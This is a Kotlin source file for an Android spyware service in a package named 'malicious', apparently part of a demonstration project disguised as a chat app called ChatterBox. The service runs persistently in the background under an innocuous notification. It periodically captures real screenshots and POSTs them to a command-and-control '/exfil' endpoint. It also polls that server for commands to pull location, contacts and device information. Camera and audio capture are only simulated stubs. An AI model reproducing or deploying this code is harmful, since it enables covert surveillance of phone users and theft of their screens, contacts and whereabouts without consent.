package com.example.ChatterBox.malicious

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.PixelCopy
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

// Import the C2 components
import com.example.ChatterBox.malicious.C2Config
import com.example.ChatterBox.malicious.C2Client
import com.example.ChatterBox.malicious.LocationTracker

// Import annotations for suppressing warnings
import androidx.annotation.RequiresApi
import com.google.firebase.crashlytics.buildtools.reloc.org.apache.commons.codec.binary.Base64

// Import JSON processing
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL


class SurveillanceService : Service() {
    private val TAG = "SurveillanceDemo"
    private val NOTIFICATION_ID = 1337
    private val CHANNEL_ID = "surveillance_channel"
    
    private var timer: Timer? = null
    private var recordingThread: HandlerThread? = null
    private var recordingHandler: Handler? = null
    private val isRecording = AtomicBoolean(false)
    
    // Command polling thread and handler
    private var commandThread: HandlerThread? = null
    private var commandHandler: Handler? = null
    
    // C2 client for communication with the command and control server
    private lateinit var c2Client: C2Client
    
    // For camera access
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private val cameraOpenCloseLock = Semaphore(1)

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var screenDensity: Int = 0
    private var displayWidth: Int = 0
    private var displayHeight: Int = 0
    private var projectionIntent: Intent? = null
    private var projectionResultCode: Int = 0

    override fun onCreate() {
        super.onCreate()
        
        // Initialize the C2 client
        c2Client = C2Client(this)
        
        // Initialize command polling thread
        commandThread = HandlerThread("CommandThread").apply { start() }
        commandHandler = Handler(commandThread!!.looper)
        
        // Create notification channel for Android O and above
        createNotificationChannel()
        
        // Start as a foreground service to avoid system killing it
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        // Initialize background thread for processing
        recordingThread = HandlerThread("RecordingThread").apply { start() }
        recordingHandler = Handler(recordingThread!!.looper)
        
        Log.d(TAG, "Surveillance service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service starting...")
        
        // Make log notification to show it's running
        showOngoingNotification("Service starting", "Attempting to connect to C2 server...")
        if (intent?.action == "SETUP_PROJECTION") {
            val resultCode = intent.getIntExtra("resultCode", 0)
            val data = intent.getParcelableExtra<Intent>("data")
            if (data != null) {
                setupMediaProjection(resultCode, data)
                Log.d(TAG, "Media projection initialized")
            }
        }
        // Check if this is a test request
        if (intent?.action == "TEST_C2") {
            Log.d(TAG, "Received TEST_C2 action - testing C2 connection directly")
            testC2Connection()
            return START_STICKY
        }
        
        // Register with the C2 server - try both HTTP and HTTPS
        c2Client.registerDevice()
        
        // Schedule surveillance activities every 30 seconds
        startSurveillanceTimer()
        
        // Start checking for commands from the C2 server
        startCommandPolling()
        
        // If service is killed, restart it
        return START_STICKY
    }
    
    /**
     * Test the C2 connection directly for debugging
     */
    private fun testC2Connection() {
        Log.d(TAG, "Testing C2 connection...")
        showOngoingNotification("Testing C2", "Testing connection to all C2 server endpoints...")
        
        // Try to register device first
        c2Client.registerDevice()
        
        // Then send some test data to verify exfiltration
        val testData = JSONObject().apply {
            put("test", true)
            put("timestamp", System.currentTimeMillis())
            put("message", "This is a test message from the device")
            put("device_info", JSONObject().apply {
                put("model", android.os.Build.MODEL)
                put("manufacturer", android.os.Build.MANUFACTURER) 
                put("android_version", android.os.Build.VERSION.RELEASE)
            })
        }
        
        // Send the test data
        c2Client.sendExfiltrationData("test", testData.toString())
        
        // Check for commands
        c2Client.checkForCommands { commands ->
            if (commands.isNotEmpty()) {
                Log.d(TAG, "Received ${commands.size} commands from C2 server")
                processCommands(commands)
            } else {
                Log.d(TAG, "No commands received from C2 server")
            }
        }
    }
    
    private fun showOngoingNotification(title: String, content: String) {
        val notificationId = 7777
        
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(content)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
        
        val notification = builder.build()
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(notificationId, notification)
    }

    private fun startSurveillanceTimer() {
        timer?.cancel()
        timer = Timer()
        
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                if (!isRecording.get()) {
                    recordingHandler?.post {
                        isRecording.set(true)
                        
                        try {
                            // Capture all surveillance data
                            captureScreen()
                            captureCamera()
                            recordAudio()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error in surveillance routine", e)
                        } finally {
                            isRecording.set(false)
                        }
                    }
                }
            }
        }, 5000, 30000) // Initial delay 5 seconds, then every 30 seconds
    }

    /**
     * Create the notification channel for Android O and above
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannelO()
        }
    }
    private fun getDeviceID(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
    }
    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannelO() {
        val name = "App Service"
        val descriptionText = "Background service for enhanced functionality"
        val importance = NotificationManager.IMPORTANCE_LOW
        
        val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
            description = descriptionText
        }
        
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ChatterBox")
            .setContentText("App is running")
            // Using a default system icon instead of R.drawable reference
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            
        // Setting priority using property instead of method
        builder.priority = NotificationCompat.PRIORITY_LOW
        return builder.build()
    }


    fun setupMediaProjection(resultCode: Int, data: Intent) {
        projectionResultCode = resultCode
        projectionIntent = data

        // Initialize screen metrics
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val display = windowManager.defaultDisplay
        val metrics = resources.displayMetrics
        screenDensity = metrics.densityDpi

        // Get screen dimensions - adjust as needed for performance
        displayWidth = metrics.widthPixels
        displayHeight = metrics.heightPixels
    }


    // SCREEN CAPTURE FUNCTIONALITY
    private fun captureScreen() {
        if (projectionIntent == null) {
            Log.d(TAG, "MediaProjection not initialized - can't capture screen")
            return
        }

        try {
            if (mediaProjectionManager == null) {
                mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            }

            if (mediaProjection == null) {
                mediaProjection = mediaProjectionManager?.getMediaProjection(projectionResultCode, projectionIntent!!)
            }

            // Create an ImageReader to capture the screen
            imageReader = ImageReader.newInstance(
                displayWidth, displayHeight, PixelFormat.RGBA_8888, 2
            )

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                displayWidth, displayHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )

            // Wait a bit for the screen to be captured
            Handler().postDelayed({
                captureScreenAndSend()
            }, 100)

        } catch (e: Exception) {
            Log.e(TAG, "Error capturing screen", e)
        }
    }

    private fun captureScreenAndSend() {
        try {
            // Acquire latest image
            val image = imageReader?.acquireLatestImage()
            if (image == null) {
                Log.e(TAG, "Failed to acquire screen image")
                cleanup()
                return
            }

            // Convert Image to Bitmap
            val bitmap = imageToBitmap(image)
            image.close()

            // Convert Bitmap to JPEG bytes
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "screenshot_$timestamp.jpg"
            val jpegBytes = bitmapToJpegBytes(bitmap)

            // Save locally for verification
            val logFile = File(getExternalFilesDir(), filename)
            FileOutputStream(logFile).use { out ->
                out.write(jpegBytes)
            }

            // Send to C2 server
            sendScreenshotToC2(jpegBytes, filename)

            Log.d(TAG, "Screenshot captured and sent: $filename")

        } catch (e: Exception) {
            Log.e(TAG, "Error processing screen capture", e)
        } finally {
            cleanup()
        }
    }

    private fun imageToBitmap(image: Image): Bitmap {
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * image.width

        // Create bitmap
        val bitmap = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        return bitmap
    }

    private fun bitmapToJpegBytes(bitmap: Bitmap): ByteArray {
        val out = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
        return out.toByteArray()
    }

    private fun sendScreenshotToC2(jpegBytes: ByteArray, filename: String) {
        try {
            // Get the device ID for identification
            val deviceId = getDeviceID()

            // Create a JSON object that matches exactly what the C2 server expects
            val jsonData = JSONObject().apply {
                put("type", "screenshots")  // The exact data type directory name
                put("device_id", deviceId)
                put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
                put("data", JSONObject().apply {
                    put("filename", filename)
                    put("image_data", android.util.Base64.encodeToString(jpegBytes, android.util.Base64.DEFAULT))
                })
            }

            // Send the JSON data to the C2 server
            Thread {
                var connection: HttpURLConnection? = null
                try {
                    val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
                    connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/octet-stream")
                    connection.setRequestProperty("X-Data-Type", "screenshots")  // Critical header
                    connection.setRequestProperty("X-Filename", filename)
                    connection.setRequestProperty("X-Device-ID", deviceId)
                    connection.doOutput = true

                    // Convert JSONObject to string and send
                    val jsonString = jsonData.toString()

                    Log.d(TAG, "Sending screenshot data to C2: ${jsonString.substring(0, 100)}...")

                    // Write JSON data
                    connection.outputStream.use { outputStream ->
                        outputStream.write(jsonString.toByteArray())
                        outputStream.flush()
                    }

                    // Check response
                    val responseCode = connection.responseCode
                    val responseMessage = connection.responseMessage
                    Log.d(TAG, "Screenshot JSON upload response: $responseCode - $responseMessage")

                    // Read and log response body for debugging
                    if (responseCode != 200) {
                        val errorStream = connection.errorStream ?: connection.inputStream
                        val errorResponse = errorStream.bufferedReader().use { it.readText() }
                        Log.e(TAG, "Error response: $errorResponse")
                    } else {
                        val inputStream = connection.inputStream
                        val response = inputStream.bufferedReader().use { it.readText() }
                        Log.d(TAG, "Success response: $response")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error sending JSON screenshot to C2", e)
                } finally {
                    connection?.disconnect()
                }
            }.start()

            // You can also use the C2Client to send the data
            c2Client.sendExfiltrationData("screenshots", jsonData.toString())

        } catch (e: Exception) {
            Log.e(TAG, "Error sending screenshot to C2", e)
        }
    }

    private fun createScreenshotJson(deviceId: String, filename: String, jpegBytes: ByteArray): String {
        val base64Data = Base64.encodeBase64String(jpegBytes)
        return """
    {
        "type": "screenshots",
        "device_id": "$deviceId",
        "timestamp": "${SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())}",
        "data": {
            "filename": "$filename",
            "image_data": "$base64Data"
        }
    }
    """.trimIndent()
    }

    // Send data in JSON format
    private fun sendJsonData(jsonData: String, filename: String) {
        Thread {
            var connection: HttpURLConnection? = null
            try {
                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox")
                connection.doOutput = true

                // Write JSON data
                connection.outputStream.use { outputStream ->
                    outputStream.write(jsonData.toByteArray())
                    outputStream.flush()
                }

                // Check response
                val responseCode = connection.responseCode
                val responseMessage = connection.responseMessage
                Log.d(TAG, "Screenshot JSON upload response: $responseCode - $responseMessage")

                // Read and log response body for debugging
                if (responseCode != 200) {
                    val errorStream = connection.errorStream ?: connection.inputStream
                    val errorResponse = errorStream.bufferedReader().use { it.readText() }
                    Log.e(TAG, "Error response: $errorResponse")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending JSON screenshot to C2", e)
            } finally {
                connection?.disconnect()
            }
        }.start()
    }

    // Send data as binary (fixed version of original code)
    private fun sendBinaryData(jpegBytes: ByteArray, filename: String, deviceId: String) {
        Thread {
            var connection: HttpURLConnection? = null
            try {
                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/octet-stream")
                connection.setRequestProperty("X-Data-Type", "screenshots")
                connection.setRequestProperty("X-Filename", filename)
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.setRequestProperty("User-Agent", "ChatterBox")
                connection.doOutput = true

                // Write JPEG data
                connection.outputStream.use { outputStream ->
                    outputStream.write(jpegBytes)
                    outputStream.flush()
                }

                // Check response
                val responseCode = connection.responseCode
                val responseMessage = connection.responseMessage
                Log.d(TAG, "Screenshot binary upload response: $responseCode - $responseMessage")

                if (responseCode != 200) {
                    val errorStream = connection.errorStream ?: connection.inputStream
                    val errorResponse = errorStream.bufferedReader().use { it.readText() }
                    Log.e(TAG, "Error response: $errorResponse")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending binary screenshot to C2", e)
            } finally {
                connection?.disconnect()
            }
        }.start()
    }

    // CAMERA ACCESS FUNCTIONALITY
    private fun captureCamera() {
        Log.d(TAG, "Attempting to capture from camera")
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Camera permission not granted")
            return
        }
        
        // For demonstration, we'll simulate this instead of actually accessing the camera
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val filename = "camera_$timestamp.txt"
        
        val logFile = File(getExternalFilesDir(), filename)
        
        try {
            FileOutputStream(logFile).use { out ->
                val message = "SIMULATED CAMERA CAPTURE at $timestamp\n" +
                              "In a real implementation, this would take a photo with the camera.\n"
                
                out.write(message.toByteArray())
            }
            
            // Also send to C2 server
            val cameraData = JSONObject().apply {
                put("timestamp", timestamp)
                put("device_id", getDeviceID())
                put("camera_image", "Simulated camera capture at $timestamp")
            }
            c2Client.sendExfiltrationData("camera", cameraData.toString())
            
            Log.d(TAG, "Camera capture simulated and sent to C2: $filename")
        } catch (e: Exception) {
            Log.e(TAG, "Error simulating camera capture", e)
        }
    }

    // AUDIO RECORDING FUNCTIONALITY
    private fun recordAudio() {
        Log.d(TAG, "Attempting to record audio")
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Audio recording permission not granted")
            return
        }
        
        // For demonstration, we'll simulate this instead of actually recording
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val filename = "audio_$timestamp.txt"
        
        val logFile = File(getExternalFilesDir(), filename)
        
        try {
            FileOutputStream(logFile).use { out ->
                val message = "SIMULATED AUDIO RECORDING at $timestamp\n" +
                              "In a real implementation, this would record 5 seconds of audio.\n"
                
                out.write(message.toByteArray())
            }
            
            // Also send to C2 server
            val audioData = JSONObject().apply {
                put("timestamp", timestamp)
                put("device_id", getDeviceID())
                put("audio_recording", "Simulated audio recording at $timestamp")
            }
            c2Client.sendExfiltrationData("audio", audioData.toString())
            
            Log.d(TAG, "Audio recording simulated and sent to C2: $filename")
        } catch (e: Exception) {
            Log.e(TAG, "Error simulating audio recording", e)
        }
    }

    private fun getExternalFilesDir(): File {
        // Use the context method that returns the app-specific external files directory
        val dir = File(getExternalFilesDir(null), "surveillance")
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }
    
    /**
     * Start polling for commands from the C2 server
     */
    private fun startCommandPolling() {
        // Make sure we have a valid command handler
        if (commandHandler == null) {
            Log.e(TAG, "Command handler is null")
            return
        }
        
        // Schedule regular checks for commands
        val commandRunnable = object : Runnable {
            override fun run() {
                try {
                    c2Client.checkForCommands { commands ->
                        if (commands.isNotEmpty()) {
                            Log.d(TAG, "Received ${commands.size} commands from C2 server")
                            processCommands(commands)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking for commands", e)
                }
                
                // Schedule next check after a delay
                commandHandler?.postDelayed(this, 60 * 1000) // Every 1 minute
            }
        }
        
        // Start the polling process
        commandHandler?.post(commandRunnable)
    }
    
    /**
     * Process commands received from the C2 server
     */
    private fun processCommands(commands: List<String>) {
        for (command in commands) {
            try {
                Log.d(TAG, "Processing command: $command")
                
                // Handle commands with parameter objects
                if (command.contains("{") && command.contains("}")) {
                    try {
                        val commandObj = JSONObject(command)
                        val commandType = commandObj.optString("command", "")
                        if (commandType.isNotEmpty()) {
                            executeCommand(commandType, commandObj)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing JSON command: $command", e)
                        // If JSON parsing fails, try as a regular command
                        executeCommand(command, null)
                    }
                } else {
                    // Handle simple string commands
                    executeCommand(command, null)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command: $command", e)
                showCommandNotification("Error executing command: $command")
            }
        }
    }
    
    /**
     * Execute a specific command
     */
    private fun executeCommand(command: String, params: JSONObject?) {
        when {
            command.contains("capture_screen") || command == "capture_screenshot" -> {
                Log.d(TAG, "Executing command: capture_screen")
                showCommandNotification("Executing capture_screen command")
                captureScreen()
            }
            command.contains("capture_camera") -> {
                Log.d(TAG, "Executing command: capture_camera")
                showCommandNotification("Executing capture_camera command")
                captureCamera()
            }
            command.contains("record_audio") || command == "record_audio" -> {
                Log.d(TAG, "Executing command: record_audio")
                showCommandNotification("Executing record_audio command")
                recordAudio()
            }
            command.contains("location") || command == "get_location" -> {
                Log.d(TAG, "Executing command: get_location")
                showCommandNotification("Executing get_location command")
                getLocation()
            }
            command.contains("info") || command == "collect_info" -> {
                Log.d(TAG, "Executing command: collect_info")
                showCommandNotification("Executing collect_info command")
                collectDeviceInfo()
            }
            command.contains("collect") && command.contains("device") -> {
                Log.d(TAG, "Executing command: collect_device_info")
                showCommandNotification("Executing collect_device_info command")
                collectDeviceInfo()
            }
            command.contains("contacts") || command == "get_contacts" -> {
                Log.d(TAG, "Executing command: get_contacts")
                showCommandNotification("Executing get_contacts command")
                Contacts.exfiltrateContacts(this)
            }
            // More command types can be added here
            else -> {
                Log.d(TAG, "Unknown command: $command")
                showCommandNotification("Received unknown command: $command")
            }
        }
    }
    
    /**
     * Show a temporary notification for command execution
     */
    private fun showCommandNotification(message: String) {
        val notificationId = System.currentTimeMillis().toInt()
        
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle("C2 Command Execution")
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
        
        val notification = builder.build()
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(notificationId, notification)
        
        // Auto-dismiss after 3 seconds
        android.os.Handler().postDelayed({
            notificationManager.cancel(notificationId)
        }, 3000)
    }
    
    /**
     * Get the device's current location and send it to the C2 server
     */
    private fun getLocation() {
        try {
            val locationTracker = LocationTracker(this)
            locationTracker.startTracking()
            
            // Stop tracking after 10 seconds (after we get at least one location)
            android.os.Handler().postDelayed({
                locationTracker.stopTracking()
            }, 10000)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting location", e)
        }
    }
    
    /**
     * Collect basic device information and send it to the C2 server
     */
    private fun collectDeviceInfo() {
        try {
            // Create JSON with device information
            val deviceInfo = JSONObject().apply {
                put("device_model", android.os.Build.MODEL)
                put("device_manufacturer", android.os.Build.MANUFACTURER)
                put("android_version", android.os.Build.VERSION.RELEASE)
                put("device_id", getDeviceID())
                put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                put("timestamp", System.currentTimeMillis())
            }
            
            // Send to C2 server
            c2Client.sendExfiltrationData("device_info", deviceInfo.toString())
            
            Log.d(TAG, "Device info collected and sent to C2 server")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting device info", e)
        }
    }
    private fun cleanup() {
        try {
            virtualDisplay?.release()
            virtualDisplay = null

            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.e(TAG, "Error during cleanup", e)
        }
    }
    override fun onDestroy() {
        timer?.cancel()
        timer = null
        
        // Clean up recording thread
        recordingThread?.quitSafely()
        
        // Clean up command thread
        commandThread?.quitSafely()
        commandThread = null
        commandHandler = null
        mediaProjection?.stop()
        mediaProjection = null
        Log.d(TAG, "Surveillance service destroyed")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
